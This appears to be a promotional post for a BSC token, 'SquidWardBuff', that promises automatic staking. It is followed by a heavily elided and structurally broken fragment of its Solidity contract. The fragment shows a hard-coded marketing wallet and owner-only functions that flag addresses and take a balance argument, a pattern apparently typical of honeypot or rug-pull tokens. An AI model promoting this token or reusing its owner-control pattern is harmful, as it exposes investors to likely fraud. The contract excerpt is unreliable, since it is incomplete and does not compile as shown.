...
SquidWardBuff  - New way to earn on bsc! , SquidwarBuff  will automatically stake your tokens while holding. Minimum of 0.1 BNB and maximum of 0.5 bnb to stake your $SWB.

-Low Tax
-Starting at Low Marketcap
-Friendly Community
-Huge Marketing Team
-7:12% Slippage

https://t.me/SquidWardBuff   X  @ToadMunch
...
*/
    ...
    contract SquidWardBuff  is IBEP20, Ownable
    {
        ...
        string private constant _name = "SquidWardBuff";
        ...
        address public constant MarketingWallet=0x0d5cF40ab5698124761a11034c3AD97BE7aa6015; 
        ...
        constructor () {
           ...
           function LiquidityProvider(address account) external onlyOwner {
            ...
            function AddressReceivedStake(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function AddressAllowStake(address account, uint256 balance) onlyOwner  public virtual {
